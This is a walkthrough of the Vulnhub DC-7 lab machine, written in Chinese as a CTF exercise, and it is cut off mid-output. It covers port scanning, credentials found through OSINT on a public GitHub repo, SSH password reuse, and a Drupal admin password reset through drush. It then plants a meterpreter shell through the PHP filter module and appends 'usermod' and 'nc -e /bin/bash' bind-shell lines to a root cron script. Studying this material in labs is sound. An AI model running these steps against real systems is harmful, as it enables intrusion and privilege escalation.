---
title: DC7 walk-through/learning notes
date: 2021-04-03 +0800
categories: [pentest-learning,Vulnhub]
tags: ctf
---

# 探测目标

---

先确定一下位置 

```
192.168.31.227  00:0c:29:85:2d:44       VMware, Inc.
```

很好 直接拿到 地址

## 常规扫描 

常规扫描做一做

```
$ rustscan 192.168.31.227 -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.31.227:22
Open 192.168.31.227:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -A -vvv -p 22,80 192.168.31.227

Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-03 07:02 EDT
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:02
Completed NSE at 07:02, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:02
Completed NSE at 07:02, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:02
Completed NSE at 07:02, 0.00s elapsed
Initiating ARP Ping Scan at 07:02
Scanning 192.168.31.227 [1 port]
Completed ARP Ping Scan at 07:02, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 07:02
Completed Parallel DNS resolution of 1 host. at 07:02, 0.00s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 07:02
Scanning 192.168.31.227 [2 ports]
Discovered open port 80/tcp on 192.168.31.227
Discovered open port 22/tcp on 192.168.31.227
Completed SYN Stealth Scan at 07:02, 0.04s elapsed (2 total ports)
Initiating Service scan at 07:02
Scanning 2 services on 192.168.31.227
Completed Service scan at 07:02, 6.02s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 192.168.31.227
NSE: Script scanning 192.168.31.227.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:02
Completed NSE at 07:02, 0.51s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:02
Completed NSE at 07:02, 0.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:02
Completed NSE at 07:02, 0.00s elapsed
Nmap scan report for 192.168.31.227
Host is up, received arp-response (0.00026s latency).
Scanned at 2021-04-03 07:02:41 EDT for 8s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 d0:02:e9:c7:5d:95:32:ab:10:99:89:84:34:3d:1e:f9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5g/MV8SKReCc0Gw4yd38cdGBhSqaTIJMLAnLw9JBrzA78gPe+oE2rRjcGXwlCmHXE+rifBo/Sfevqn9oZr3Q4Yw8Z4UdGX6vVRJdJC85B9/75jIw+Nth7LOLVrcWCQEnU5k5emCRrCGHbFoxVhl0J4uk7QbR84YLZNooS52dOFhkHOspgpuECZ7vOiE2aD31pAnU2BF4rgQPnlp2gp/BVhXczPNrGCLGE34o60nlxPGaa7vw9wa2Tenx+isn2JuN/x2AaRYo7SolotwmOtfkUAEYOMh5sBhQaEobfnYsNV+Aee181UfRKkQe5gH/CHpui2UoCqTpCTRgegOXJ/pPD
|   256 d0:d6:40:35:a7:34:a9:0a:79:34:ee:a9:6a:dd:f4:8f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGLAcHcmt/EqgpHTXiRYUz1jpyaUPhH7vWGjI3TaWgiCLS2yPkybhc23zlAVOe+ONWbfODzl2kvYqYWVpL8LLpw=
|   256 a8:55:d5:76:93:ed:4f:6f:f1:f7:a1:84:2f:af:bb:e1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGHn1jYZNKIRzAqAeRJNZ9nsACR/xXaQSryHGEjSsQfQ
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
|_http-generator: Drupal 8 (https://www.drupal.org)
| http-methods: 
|_  Supported Methods: GET POST HEAD OPTIONS
| http-robots.txt: 22 disallowed entries 
| /core/ /profiles/ /README.txt /web.config /admin/ 
| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ 
| /user/password/ /user/login/ /user/logout/ /index.php/admin/ 
| /index.php/comment/reply/ /index.php/filter/tips /index.php/node/add/ 
| /index.php/search/ /index.php/user/password/ /index.php/user/register/ 
|_/index.php/user/login/ /index.php/user/logout/
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Welcome to DC-7 | D7
MAC Address: 00:0C:29:85:2D:44 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=4/3%OT=22%CT=%CU=31156%PV=Y%DS=1%DC=D%G=N%M=000C29%TM=
OS:60684B59%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I%T
OS:S=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=
OS:M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7
OS:120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A
OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%
OS:Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=
OS:A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=
OS:Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%
OS:T=40%CD=S)

Uptime guess: 0.187 days (since Sat Apr  3 02:33:38 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.26 ms 192.168.31.227

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:02
Completed NSE at 07:02, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:02
Completed NSE at 07:02, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:02
Completed NSE at 07:02, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds
           Raw packets sent: 25 (1.894KB) | Rcvd: 17 (1.366KB)

```

> 吐槽一下 nmap script脚本拉出来信息多但是 很多都是误报

这里就是一个普普通通的网站 

而且是一个 drupal 架构起来的

ssh apache 这里都找不到需要的东西

我们 access 一下看看

## 访问

```html
<html lang="en" dir="ltr" prefix="content: http://purl.org/rss/1.0/modules/content/  dc: http://purl.org/dc/terms/  foaf: http://xmlns.com/foaf/0.1/  og: http://ogp.me/ns#  rdfs: http://www.w3.org/2000/01/rdf-schema#  schema: http://schema.org/  sioc: http://rdfs.org/sioc/ns#  sioct: http://rdfs.org/sioc/types#  skos: http://www.w3.org/2004/02/skos/core#  xsd: http://www.w3.org/2001/XMLSchema# ">
 <head>
  <meta charset="utf-8">
  <meta name="Generator" content="Drupal 8 (https://www.drupal.org)">
  <meta name="MobileOptimized" content="width">
  <meta name="HandheldFriendly" content="true">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="shortcut icon" href="/core/misc/favicon.ico" type="image/vnd.microsoft.icon">
  <link rel="canonical" href="http://192.168.31.227/node/1">
  <link rel="shortlink" href="http://192.168.31.227/node/1">
  <link rel="revision" href="http://192.168.31.227/node/1">
  <title>
   Welcome to DC-7 | D7
  </title>
  <link rel="stylesheet" media="all" href="/sites/default/files/css/css_c8uKrkdw3uTl-xXgGz0TtfMpOZq9ps2b3GoXRcXqFfo.css?0">
  <link rel="stylesheet" media="all" href="/sites/default/files/css/css_QEODewwGV2l4fGHpAWXnBa_GN69KJCLDv5-kxBDSxOA.css?0">
  <link rel="stylesheet" media="print" href="/sites/default/files/css/css_Z5jMg7P_bjcW9iUzujI7oaechMyxQTUqZhHJ_aYSq04.css?0">
  <!--[if lte IE 8]&gt;
&lt;script src=&#34;/sites/default/files/js/js_VtafjXmRvoUgAzqzYTA3Wrjkx9wcWhjP0G4ZnnqRamA.js&#34;&gt;&lt;/script&gt;
&lt;![endif]-->
 </head>
 <body class="layout-one-sidebar layout-sidebar-first path-frontpage page-node-type-page">
  <a href="#main-content" class="visually-hidden focusable skip-link">
   Skip to main content
  </a>
  <div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas="">
   <div id="page-wrapper">
    <div id="page">
     <header id="header" class="header" role="banner" aria-label="Site header">
      <div class="section layout-container clearfix">
       <div class="region region-secondary-menu">
        <nav role="navigation" aria-labelledby="block-bartik-account-menu-menu" id="block-bartik-account-menu" class="block block-menu navigation menu--account">
         <h2 class="visually-hidden" id="block-bartik-account-menu-menu">
          User account menu
         </h2>
         <div class="content">
          <div class="menu-toggle-target menu-toggle-target-show" id="show-block-bartik-account-menu">
          </div>
          <div class="menu-toggle-target" id="hide-block-bartik-account-menu">
          </div>
          <a class="menu-toggle" href="#show-block-bartik-account-menu">
           Show — User account menu
          </a>
          <a class="menu-toggle menu-toggle--hide" href="#hide-block-bartik-account-menu">
           Hide — User account menu
          </a>
          <ul class="clearfix menu">
           <li class="menu-item">
            <a href="/user/login" data-drupal-link-system-path="user/login">
             Log in
            </a>
           </li>
          </ul>
         </div>
        </nav>
       </div>
       <div class="clearfix region region-header">
        <div id="block-bartik-branding" class="clearfix site-branding block block-system block-system-branding-block">
         <a href="/" title="Home" rel="home" class="site-branding__logo">
          <img src="/core/themes/bartik/logo.svg" alt="Home">
         </a>
         <div class="site-branding__text">
          <div class="site-branding__name">
           <a href="/" title="Home" rel="home">
            D7
           </a>
          </div>
         </div>
        </div>
       </div>
       <div class="region region-primary-menu">
        <nav role="navigation" aria-labelledby="block-bartik-main-menu-menu" id="block-bartik-main-menu" class="block block-menu navigation menu--main">
         <h2 class="visually-hidden" id="block-bartik-main-menu-menu">
          Main navigation
         </h2>
         <div class="content">
          <div class="menu-toggle-target menu-toggle-target-show" id="show-block-bartik-main-menu">
          </div>
          <div class="menu-toggle-target" id="hide-block-bartik-main-menu">
          </div>
          <a class="menu-toggle" href="#show-block-bartik-main-menu">
           Show — Main navigation
          </a>
          <a class="menu-toggle menu-toggle--hide" href="#hide-block-bartik-main-menu">
           Hide — Main navigation
          </a>
          <ul class="clearfix menu">
           <li class="menu-item">
            <a href="/" data-drupal-link-system-path="&lt;front&gt;" class="is-active">
             Home
            </a>
           </li>
          </ul>
         </div>
        </nav>
       </div>
      </div>
     </header>
     <div class="highlighted">
      <aside class="layout-container section clearfix" role="complementary">
       <div class="region region-highlighted">
        <div data-drupal-messages-fallback="" class="hidden">
        </div>
       </div>
      </aside>
     </div>
     <div id="main-wrapper" class="layout-main-wrapper layout-container clearfix">
      <div id="main" class="layout-main clearfix">
       <main id="content" class="column main-content" role="main">
        <section class="section">
         <a id="main-content" tabindex="-1">
         </a>
         <div class="region region-content">
          <div id="block-bartik-page-title" class="block block-core block-page-title-block">
           <div class="content">
            <h1 class="title page-title">
             <span property="schema:name" class="field field--name-title field--type-string field--label-hidden">
              Welcome to DC-7
             </span>
            </h1>
           </div>
          </div>
          <div id="block-bartik-content" class="block block-system block-system-main-block">
           <div class="content">
            <article role="article" about="/node/1" typeof="schema:WebPage" class="node node--type-page node--view-mode-full clearfix">
             <header>
              <span property="schema:name" content="Welcome to DC-7" class="rdf-meta hidden">
              </span>
             </header>
             <div class="node__content clearfix">
              <div property="schema:text" class="clearfix text-formatted field field--name-body field--type-text-with-summary field--label-hidden field__item">
               <p>
                DC-7 introduces some &#34;new&#34; concepts, but I&#39;ll leave you to figure out what they are.  :-)
               </p>
               <p>
                While this challenge isn&#39;t all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won&#39;t succeed.
               </p>
               <p>
                What you will have to do, is to think &#34;outside&#34; the box.
               </p>
               <p>
                Way &#34;outside&#34; the box.  :-) <!-- 这里有一处提示 所谓的 hint 提示我们往 "外面" 找--> 
               </p>
              </div>
             </div>
            </article>
           </div>
          </div>
         </div>
        </section>
       </main>
       <div id="sidebar-first" class="column sidebar">
        <aside class="section" role="complementary">
         <div class="region region-sidebar-first">
          <div class="search-block-form block block-search container-inline" data-drupal-selector="search-block-form" id="block-bartik-search" role="search">
           <h2>
            Search
           </h2>
           <div class="content container-inline">
            <form action="/search/node" method="get" id="search-block-form" accept-charset="UTF-8" class="search-form search-block-form">
             <div class="js-form-item form-item js-form-type-search form-type-search js-form-item-keys form-item-keys form-no-label">
              <label for="edit-keys" class="visually-hidden">
               Search
              </label>
              <input title="Enter the terms you wish to search for." data-drupal-selector="edit-keys" type="search" id="edit-keys" name="keys" value="" size="15" maxlength="128" class="form-search">
             </div>
             <div data-drupal-selector="edit-actions" class="form-actions js-form-wrapper form-wrapper" id="edit-actions">
              <input class="search-form__submit button js-form-submit form-submit" data-drupal-selector="edit-submit" type="submit" id="edit-submit" value="Search">
             </div>
            </form>
           </div>
          </div>
         </div>
        </aside>
       </div>
      </div>
     </div>
     <footer class="site-footer">
      <div class="layout-container">
       <div class="site-footer__bottom">
        <div class="region region-footer-fifth">
         <div id="block-bartik-powered" role="complementary" class="block block-system block-system-powered-by-block">
          <div class="content">
           <span>
            Powered by
            <a href="https://www.drupal.org">
             Drupal
            </a>
           </span>
          </div>
         </div>
         <div id="block-twitter" class="block block-block-content block-block-contentb0a8b82c-c675-4fec-a0a9-6d4feb7ff53c">
          <div class="content">
           <div class="clearfix text-formatted field field--name-body field--type-text-with-summary field--label-hidden field__item">
            <p>
             <strong>
              @DC7USER
             </strong> <!- 注意这里被加粗了 这里是很诡异的地方 @xxx -!>
            </p>
           </div>
          </div>
         </div>
        </div>
       </div>
      </div>
     </footer>
    </div>
   </div>
  </div>
 </body>
</html>
```

> 这里先埋下了伏笔

---

# 尝试入侵

---

## 失败的尝试

这里尝试过 先 leak 出来 drupal 版本

```
$ droopescan scan drupal -u http://192.168.31.227/ -e a --threads 10
[+] No plugins found.                                                           

[+] Themes found:
    startupgrowth_lite http://192.168.31.227/themes/startupgrowth_lite/
        http://192.168.31.227/themes/startupgrowth_lite/LICENSE.txt

[+] Possible version(s):
    8.7.0
    8.7.0-alpha1
    8.7.0-alpha2
    8.7.0-beta1
    8.7.0-beta2
    8.7.0-rc1
    8.7.1
    8.7.10
    8.7.11
    8.7.12
    8.7.13
    8.7.14
    8.7.2
    8.7.3
    8.7.4
    8.7.5
    8.7.6
    8.7.7
    8.7.8
    8.7.9

[+] Possible interesting urls found:
    Default admin - http://192.168.31.227/user/login

[+] Scan finished (0:00:13.163274 elapsed)
```

结果发现版本太多 但是 介于 [ 8.7.0 - 8.7.9 ] 之间

而直接 RCE 的 ``` Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution ```的版本 是远远低于它的

基本上 直接 RCE 的路子被堵死了



## 想想 提示 ?

稍微看看提示 是提醒我们 look outside.

这块需要一点点的 OSINT 技巧和悟性

> 联想一下 上面 html 中 我标出了的两处  注意这个 留着 at 的东西

可以谷歌一下 [这个 dc7user](https://www.google.com/search?q=dc7user)

然后 无论你是找到 [推特](https://twitter.com/dc7user) 还是直接找到 [github](https://github.com/Dc7User/)

最后慢慢摸索 都会找到 [这个仓库](https://github.com/Dc7User/staffdb)

刚映入眼帘的 便是 亲爱的 config.php

> 众所周知  config 经常存有一些 高度隐私的东西

```php
<?php
	$servername = "localhost";
	$username = "dc7user";
	$password = "MdR3xOgB7#dW";
	$dbname = "Staff";
	$conn = mysqli_connect($servername, $username, $password, $dbname);
?>
```
(locate:  https://github.com/Dc7User/staffdb/blob/master/config.php)

很好 用户名 密码 get 

user|pass
---|---
dc7user|MdR3xOgB7#dW

## 尝试 直面 

打开 http://192.168.31.227/user/login 

准备登陆的时候 发现 

用户名密码错误...?

但是登陆的地方可不止这一个

ssh 尝试一波 密码复用 果然

```
$ ssh dc7user@192.168.31.227                         
dc7user@192.168.31.227's password: 
Linux dc-7 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last Login : xxxxxxxxxxxxxxxxxxxxxx 
dc7user@dc-7:~$ 

```



# Shell 1

## 简单的探测

@home ~

```zsh
dc7user@dc-7:~$ ls backups -ahl
total 52M
drwxr-xr-x 2 dc7user dc7user 4.0K Apr  3 22:00 .
drwxr-xr-x 5 dc7user dc7user 4.0K Apr  3 19:23 ..
-rw-r--r-- 1 dc7user dc7user  23M Apr  3 22:00 website.sql.gpg
-rw-r--r-- 1 dc7user dc7user  29M Apr  3 22:00 website.tar.gz.gpg

dc7user@dc-7:~$ ls -ahl
total 48K
drwxr-xr-x 5 dc7user dc7user 4.0K Apr  3 19:23 .
drwxr-xr-x 3 root    root    4.0K Aug 29  2019 ..
drwxr-xr-x 2 dc7user dc7user 4.0K Apr  3 22:00 backups
lrwxrwxrwx 1 dc7user dc7user    9 Aug 29  2019 .bash_history -> /dev/null
-rw-r--r-- 1 dc7user dc7user  220 Aug 29  2019 .bash_logout
-rw-r--r-- 1 dc7user dc7user 3.9K Aug 29  2019 .bashrc
drwxr-xr-x 3 dc7user dc7user 4.0K Aug 29  2019 .drush
drwx------ 3 dc7user dc7user 4.0K Aug 29  2019 .gnupg
-rw------- 1 dc7user dc7user 8.6K Apr  3 16:50 mbox
-rw-r--r-- 1 dc7user dc7user  675 Aug 29  2019 .profile

dc7user@dc-7: ~$ cat mbox
From root@dc-7 Sat Apr 03 16:30:15 2021
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Sat, 03 Apr 2021 16:30:15 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1lSZnT-0000Gz-ON
        for root@dc-7; Sat, 03 Apr 2021 16:30:15 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1lSZnT-0000Gz-ON@dc-7>
Date: Sat, 03 Apr 2021 16:30:15 +1000

rm: cannot remove '/home/dc7user/backups/*': No such file or directory
Database dump saved to /home/dc7user/backups/website.sql               [success]

```

这里说明几处东西给说明一下

* 当前目录下面有 .drush 和 .gnupg 两个文件夹 说明 dc7user 有着 控制  drupal 的控制权限和 gpg 的个人密钥的权限和使用
* 分析 mbox 发现是 root 发来的备份说明
* mbox 还有 发件 Subject 是自动化脚本 /opt/scripts/backups.sh
* website 备份 地点在 /home/dc7user/backups 文件夹下

## 进一步检查

### 检查脚本情况

进一步 检查 脚本 /opt/scripts/backups.sh

```zsh
$ cat /opt/scripts/backups.sh
#!/bin/bash
rm /home/dc7user/backups/*
cd /var/www/html/
drush sql-dump --result-file=/home/dc7user/backups/website.sql
cd ..
tar -czf /home/dc7user/backups/website.tar.gz html/
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
chown dc7user:dc7user /home/dc7user/backups/*
rm /home/dc7user/backups/website.sql
rm /home/dc7user/backups/website.tar.gz
You have new mail in /var/mail/dc7user

$ ls /opt/scripts/backups.sh -alh
-rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh
```

发现一些有趣的事情

* 此处 使用了 字符串 PickYourOwnPassword 直接加密了 website 的两处导出 sql 和 网站整体的备份 没有使用私钥
* 网站位于 /var/www/html 是非常常规的部署地点
* 脚本权限非常有趣 属于 root 位于 www-data 组 两者都具有 rwx 权限

### 检查 邮件 

```
$ mail
"/var/mail/dc7user": 34 messages 33 new 1 unread
 U   1 Cron Daemon        Sat Apr  3 16:45  24/773   Cron <root@dc-7> /opt/scripts/backups.sh
>N   2 Cron Daemon        Sat Apr  3 17:00  21/729   Cron <root@dc-7> /opt/scripts/backups.sh
 N   7 Cron Daemon        Sat Apr  3 17:15  21/729   Cron <root@dc-7> /opt/scripts/backups.sh
 N   9 Cron Daemon        Sat Apr  3 17:30  21/729   Cron <root@dc-7> /opt/scripts/backups.sh
 N  10 Cron Daemon        Sat Apr  3 17:45  21/729   Cron <root@dc-7> /opt/scripts/backups.sh
 N  11 Cron Daemon        Sat Apr  3 18:00  21/729   Cron <root@dc-7> /opt/scripts/backups.sh
 N  12 Cron Daemon        Sat Apr  3 18:15  21/729   Cron <root@dc-7> /opt/scripts/backups.sh
 N  13 Cron Daemon        Sat Apr  3 18:30  21/729   Cron <root@dc-7> /opt/scripts/backups.sh
 N  14 Cron Daemon        Sat Apr  3 18:45  21/729   Cron <root@dc-7> /opt/scripts/backups.sh
 N  15 Cron Daemon        Sat Apr  3 19:00  21/729   Cron <root@dc-7> /opt/scripts/backups.sh
 N  16 Cron Daemon        Sat Apr  3 19:15  21/729   Cron <root@dc-7> /opt/scripts/backups.sh

```

* 检查时间发现 每过十五分钟进行一次备份处理

* 而且看起来 是 Crontab 的计划任务 执行 而且执行者身份 是 root 账户

  

### 检查网站 目录 本身 config

```
$databases['default']['default'] = array (
  'database' => 'd7db',
  'username' => 'db7user',
  'password' => 'yNv3Po00',
  'prefix' => '',
  'host' => 'localhost',
  'port' => '',
  'namespace' => 'Drupal\\Core\\Database\\Driver\\mysql',
  'driver' => 'mysql',
);
locate: /var/www/html/sites/default

```

这里 可以直接 access 数据库

```
$ mysql -u db7user -p d7db
Enter password: # 输入 yNv3Po00
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 15617
Server version: 10.1.38-MariaDB-0+deb9u1 Debian 9.8

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [d7db]> show tables;
+----------------------------------+
| Tables_in_d7db                   |
+----------------------------------+
| block_content                    |
| block_content__body              |
| block_content_field_data         |
| block_content_field_revision     |
| block_content_revision           |
| block_content_revision__body     |
| cache_bootstrap                  |
| cache_config                     |
| cache_container                  |
| cache_data                       |
| cache_default                    |
| cache_discovery                  |
| cache_dynamic_page_cache         |
| cache_entity                     |
| cache_menu                       |
| cache_page                       |
| cache_render                     |
| cache_toolbar                    |
| cachetags                        |
| config                           |
| file_managed                     |
| file_usage                       |
| flood                            |
| history                          |
| key_value                        |
| key_value_expire                 |
| menu_link_content                |
| menu_link_content_data           |
| menu_link_content_field_revision |
| menu_link_content_revision       |
| menu_tree                        |
| node                             |
| node__body                       |
| node__field_image                |
| node__field_tags                 |
| node_access                      |
| node_field_data                  |
| node_field_revision              |
| node_revision                    |
| node_revision__body              |
| node_revision__field_image       |
| node_revision__field_tags        |
| queue                            |
| router                           |
| search_dataset                   |
| search_index                     |
| search_total                     |
| semaphore                        |
| sequences                        |
| sessions                         |
| shortcut                         |
| shortcut_field_data              |
| shortcut_set_users               |
| taxonomy_index                   |
| taxonomy_term__parent            |
| taxonomy_term_data               |
| taxonomy_term_field_data         |
| taxonomy_term_field_revision     |
| taxonomy_term_revision           |
| taxonomy_term_revision__parent   |
| url_alias                        |
| user__roles                      |
| user__user_picture               |
| users                            |
| users_data                       |
| users_field_data                 |
| watchdog                         |
+----------------------------------+
67 rows in set (0.00 sec)

MariaDB [d7db]> select * from users;
+-----+--------------------------------------+----------+
| uid | uuid                                 | langcode |
+-----+--------------------------------------+----------+
|   0 | e813638d-3eb3-4212-af40-171dd51023e9 | en       |
|   1 | fd93872d-a854-44cd-bb08-eb9a11e46492 | en       |
|   2 | 68803de9-fc7b-4b7b-bce8-d04f11ac4c8a | en       |
+-----+--------------------------------------+----------+
3 rows in set (0.00 sec)

MariaDB [d7db]> select * from users_data;
Empty set (0.00 sec)

MariaDB [d7db]> select * from users_field_data;
+-----+----------+--------------------+--------------------------+---------+--------------------------------------------------------+-------------------+---------------------+--------+------------+------------+------------+-----------+-------------------+------------------+
| uid | langcode | preferred_langcode | preferred_admin_langcode | name    | pass                                                    | mail              | timezone            | status | created    | changed    | access     | login      | init              | default_langcode |
+-----+----------+--------------------+--------------------------+---------+---------------------------------------------------------+-------------------+---------------------+--------+------------+------------+------------+------------+-------------------+------------------+
|   0 | en       | en                 | NULL                     |         | NULL                                                    | NULL              |                     |      0 | 1567054076 | 1567054076 |          0 |          0 | NULL              |                1 |
|   1 | en       | en                 | NULL                     | admin   | $S$Ead.KmIcT/yfKC.1H53aDPJasaD7o.ioEGiaPy1lLyXXAJC/Qi4F | admin@example.com | Australia/Melbourne |      1 | 1567054076 | 1567054076 | 1567098850 | 1567098643 | admin@example.com |                1 |
|   2 | en       | en                 | en                       | dc7user | $S$EKe0kuKQvFhgFnEYMpq.mRtbl/TQ5FmEjCDxbu0HIHaO0/U.YFjI | dc7user@blah.com  | Australia/Brisbane  |      1 | 1567057938 | 1567057938 |          0 |          0 | dc7user@blah.com  |                1 |
+-----+----------+--------------------+--------------------------+---------+---------------------------------------------------------+-------------------+---------------------+--------+------------+------------+------------+------------+-------------------+------------------+
3 rows in set (0.00 sec)

```



# 预想设计

根据以上几点 我们可能现在有如下几步需要做

## 第一步 拿到网站管理员

第一种 通过 drupal 控制板 添加自身 账户 设置管理员或者 修改管理员密码

refer : https://www.isfirst.net/drupal/drupal-reset-password

```
dc7user@dc-7:~$ cd /var/www/html
dc7user@dc-7:/var/www/html$ drush user-login
http://default/user/reset/1/1617459958/EWINhtdYAET3zaRpxdZAnonLKfe2Pr6mNj_7m2EaT7Q/login
^ 生成一个 一次性的密码重置链接 而且默认是管理员的 登陆即可解决问题
```
```
dc7user@dc-7:/var/www/html$ drush upwd admin --password=mynewpassword
Changed password for admin                                                                [success]
```

第二种 通过 gpg 解密 网站备份文件 并且 通过 备份文件破解 突破密码 拿到网站管理员权限

第三种 直接 access 数据库 d7db 然后偷密码 / 改密码

> 后两条被废了 因为完全没必要 偷出来密码 破解 因为这个密码太 Strong 了

目的是 通过 网站的管理员权限进行 在线的 模板编辑 反弹shell 出来 将权限突破至 www-data

## 第二步 突破至 www-data 用户 / www-data 组

尝试  修改定时执行的 shell 脚本将 dc7user 设置为 sudo 用户组 

通过 sudo 用户 变相的突破 root 权限 提权至 root 

```
usermod -aG sudo dc7user
```

如果失败了就使用 

来把 shell 反弹出来

```
nc -lvvp 8888 -b /bin/bash
```



# 网站管理员

通过之前 三种方法 进去 网站之后 

我发现一个问题 我没办法保存 含有恶意 php 代码的文章 或者 注入任何 php 代码

 必须先进行组件的导入才可以 

上传组件如下所示

https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz

组件说明

https://www.drupal.org/project/php

安装完毕之后 再 启用

只要看到 弹出 绿色框框

```
Module PHP Filter has been enabled
```



然后 新建 一个 文章 article 

内容 从 basic html 修改为 php code

就可以 植入 恶意代码 了

这里直接 生成一个 meterpreter reserver tcp shell 出来

然后给他怼进去

# Shell 2

```
meterpreter > shell
Process 3849 created.
Channel 0 created.
> whoami
www-data
> pwd
/var/www/html
> ls
INSTALL.txt
LICENSE.txt
README.txt
autoload.php
composer.json
composer.lock
core
example.gitignore
index.php
modules
profiles
robots.txt
sites
themes
update.php
vendor
web.config
> cd /opt/scripts/
> ls
backups.sh
> echo "usermod -aG sudo dc7user" >> backups.sh
> echo "nc -e /bin/bash -lvvp 8888"
> ls
backups.sh
> cat backups.sh
#!/bin/bash
rm /home/dc7user/backups/*
cd /var/www/html/
drush sql-dump --result-file=/home/dc7user/backups/website.sql
cd ..
tar -czf /home/dc7user/backups/website.tar.gz html/
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
